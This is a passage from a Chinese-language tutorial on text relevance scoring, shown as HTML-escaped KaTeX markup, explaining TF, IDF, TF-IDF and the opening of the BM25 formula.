style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;在&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;一&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;类&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;中&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;词&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;条&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;出&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;现&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;次&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.686em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;idfinverse-document-frequency&#34;&gt;IDF(Inverse Document Frequency)&lt;/h3&gt;
&lt;p&gt;逆向文件频率(IDF)：某一特定词语的IDF，可以由总文件数目除以包含该词语的文件的数目，再将得到的商取对数得到。&lt;/p&gt;
&lt;p&gt;如果包含词条t的文档越少, IDF越大，则说明词条具有很好的类别区分能力。&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;I&lt;/mi&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;语&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;料&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;库&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;的&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;文&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;档&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;总&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;数&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;包&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;含&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;词&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;条&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;的&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;文&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;档&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;书&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;IDF_w = log(\frac{语料库的文档总数}{包含词条w的文档书+1})
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07847em;&#34;&gt;I&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.51933em;vertical-align:-0.7693300000000001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.677em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;包&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;含&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;词&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;条&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;文&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;档&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;书&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;语&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;料&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;库&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;文&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;档&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;总&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.7693300000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;+1是为了避免分母为0。&lt;/p&gt;
&lt;h3 id=&#34;tf-idf-2&#34;&gt;TF-IDF&lt;/h3&gt;
&lt;p&gt;某一特定文件内的高词语频率，以及该词语在整个文件集合中的低文件频率，可以产生出高权重的TF-IDF。因此，TF-IDF倾向于过滤掉常见的词语，保留重要的词语。&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;I&lt;/mi&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mi&gt;I&lt;/mi&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;词&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;条&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;数&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;量&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;单&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;词&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;总&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;数&lt;/mi&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;文&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;档&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;总&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;数&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;包&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;含&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;词&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;条&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;的&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;文&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;档&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;数&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;TF-IDF = TF * IDF = \frac{词条w数量}{单词总数}*log(\frac{文档总数}{包含w词条的文档数+1})
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.76666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07847em;&#34;&gt;I&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07847em;&#34;&gt;I&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.7935600000000003em;vertical-align:-0.686em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.10756em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;单&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;词&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;总&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;词&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;条&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;量&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.686em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.51933em;vertical-align:-0.7693300000000001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.677em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;包&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;含&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;词&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;条&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;文&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;档&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;文&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;档&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;总&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.7693300000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;注：TF-IDF算法非常容易理解，并且很容易实现，但是其简单结构并没有考虑词语的语义信息，无法处理一词多义与一义多词的情况。&lt;/p&gt;
&lt;h2 id=&#34;bm25&#34;&gt;BM25&lt;/h2&gt;
&lt;p&gt;BM(Best Match) 计算query与文档相似度得分的算法，是TF-IDF的优化版本，25指25次算法迭代。&lt;/p&gt;
&lt;p&gt;BM25的一般公式是：&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;munderover&gt;&lt;mo&gt;∑&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;/munderover&gt;&lt;msub&gt;&lt;mi&gt;W&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;Score(Q,d)=\sum_i^nW_iR(q_i,d)
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;Q&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.929066em;vertical-align:-1.277669em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mop op-limits&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.6513970000000002em;&#34;&gt;&lt;span style=&#34;top:-1.872331em;margin-left:0em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.05em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.050005em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.05em;&#34;&gt;&lt;/span&gt;&lt;span&gt;&lt;span class=&#34;mop op-symbol large-op&#34;&gt;∑&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-4.3000050000000005em;margin-left:0em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.05em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.277669em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;W&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span 